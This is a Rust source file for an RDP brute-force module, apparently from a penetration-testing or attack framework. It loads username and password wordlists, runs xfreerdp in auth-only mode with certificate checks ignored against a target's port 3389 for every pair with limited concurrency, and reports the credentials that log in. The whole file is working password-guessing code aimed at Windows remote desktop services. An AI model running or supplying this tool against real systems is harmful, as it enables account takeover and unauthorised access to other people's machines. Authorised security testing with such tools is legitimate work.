use std::process::Stdio;
use std::sync::Arc;
use std::time::Duration;
use futures_util::stream::FuturesUnordered;
use futures_util::StreamExt;
use tokio::sync::Semaphore;
use crate::models::Job;
use crate::state::AppState;
use crate::db::repository;
use super::{DEFAULT_PASSWORDS, DEFAULT_USERNAMES, load_wordlist};

pub struct RdpBruteForce;

impl RdpBruteForce {
    pub async fn run(job: &Job, state: &Arc<AppState>) -> Result<String, String> {
        let cfg = job.config.as_object().ok_or("Invalid job config")?;

        let target = cfg["target"].as_str().ok_or("Missing target")?.to_string();
        let port = cfg.get("port").and_then(|v| v.as_u64()).unwrap_or(3389) as u16;
        // RDP NLA auth is comparatively heavy, so keep default concurrency low.
        let concurrency = cfg.get("concurrency").and_then(|v| v.as_u64()).unwrap_or(2) as usize;
        let domain = cfg.get("domain").and_then(|v| v.as_str()).unwrap_or("").to_string();

        // Delegate the RDP handshake to FreeRDP (same pattern as nmap/smbclient).
        let binary = match freerdp_binary().await {
            Some(b) => b,
            None => {
                let msg = "xfreerdp not found — install FreeRDP to run RDP brute force \
                           (Debian/Pi: `sudo apt-get install freerdp2-x11`).";
                let _ = repository::add_log(&state.db, "ERROR", "attacks", Some("rdp-brute"), Some(&job.id), msg).await;
                return Err(msg.to_string());
            }
        };

        let usernames = load_wordlist(cfg, "usernames", "usernames_path", DEFAULT_USERNAMES).await;
        let passwords = load_wordlist(cfg, "passwords", "wordlist_path", DEFAULT_PASSWORDS).await;

        let total = usernames.len() * passwords.len();
        let _ = state.broadcaster.send(format!(
            "scan_progress:{}:RDP brute — {} usernames × {} passwords = {} attempts on {}:{}",
            job.id, usernames.len(), passwords.len(), total, target, port
        ));

        let sem = Arc::new(Semaphore::new(concurrency));
        let mut futs = FuturesUnordered::new();

        for username in &usernames {
            for password in &passwords {
                let target = target.clone();
                let domain = domain.clone();
                let binary = binary.clone();
                let username = username.clone();
                let password = password.clone();
                let sem = sem.clone();

                futs.push(async move {
                    let _permit = sem.acquire_owned().await.unwrap();
                    let result = try_rdp_login(&binary, &target, port, &domain, &username, &password).await;
                    (username, password, result)
                });
            }
        }

        let mut found: Vec<String> = Vec::new();
        let mut attempted: usize = 0;

        while let Some((user, pass, result)) = futs.next().await {
            attempted += 1;

            if attempted % 20 == 0 {
                let _ = state.broadcaster.send(format!(
                    "scan_progress:{}:{}/{} attempts ({} found)",
                    job.id, attempted, total, found.len()
                ));
            }

            if attempted % 10 == 0 {
                if let Ok(Some(j)) = repository::get_job(&state.db, &job.id).await {
                    if j.is_cancelled() {
                        let _ = state.broadcaster.send(format!(
                            "scan_progress:{}:Cancelled after {} attempts", job.id, attempted
                        ));
                        break;
                    }
                }
            }

            match result {
                Ok(true) => {
                    let cred = format!("{}:{}", user, pass);
                    let _ = state.broadcaster.send(format!(
                        "scan_progress:{}:Found credentials: {}", job.id, cred
                    ));
                    found.push(cred);
                }
                Ok(false) => {}
                Err(e) => {
                    tracing::debug!("[rdp-brute] {}:{} → {}", user, pass, e);
                }
            }
        }

        let results = serde_json::json!({
            "target": target,
            "port": port,
            "attempts": attempted,
            "found": found,
        });
        Ok(results.to_string())
    }
}

/// Return the FreeRDP binary name that is available, if any (`xfreerdp` then `xfreerdp3`).
async fn freerdp_binary() -> Option<String> {
    for bin in ["xfreerdp", "xfreerdp3"] {
        let ok = tokio::process::Command::new(bin)
            .arg("/version")
            .stdin(Stdio::null())
            .output()
            .await
            .map(|o| o.status.success())
            .unwrap_or(false);
        if ok {
            return Some(bin.to_string());
        }
    }
    None
}

/// Attempt an RDP login using FreeRDP's `+auth-only` mode, which performs the NLA
/// handshake and exits without opening a session. Exit status 0 means the
/// credentials authenticated successfully.
async fn try_rdp_login(
    binary: &str,
    host: &str,
    port: u16,
    domain: &str,
    user: &str,
    pass: &str,
) -> Result<bool, String> {
    let mut cmd = tokio::process::Command::new(binary);
    cmd.arg(format!("/v:{}:{}", host, port))
        .arg(format!("/u:{}", user))
        .arg(format!("/p:{}", pass))
        .arg("+auth-only")
        .arg("/cert:ignore")
        .stdin(Stdio::null())
        .stdout(Stdio::null());
    if !domain.is_empty() {
        cmd.arg(format!("/d:{}", domain));
    }

    let output = tokio::time::timeout(Duration::from_secs(15), cmd.output())
        .await
        .map_err(|_| "xfreerdp timeout".to_string())?
        .map_err(|e| format!("failed to run xfreerdp: {}", e))?;

    if output.status.success() {
        return Ok(true);
    }

    let stderr = String::from_utf8_lossy(&output.stderr);
    if stderr.contains("LOGON_FAILURE")
        || stderr.contains("ACCOUNT_")
        || stderr.contains("ACCESS_DENIED")
    {
        Ok(false)
    } else if stderr.trim().is_empty() {
        Ok(false)
    } else {
        Err(stderr.trim().lines().last().unwrap_or("rdp error").to_string())
    }
}
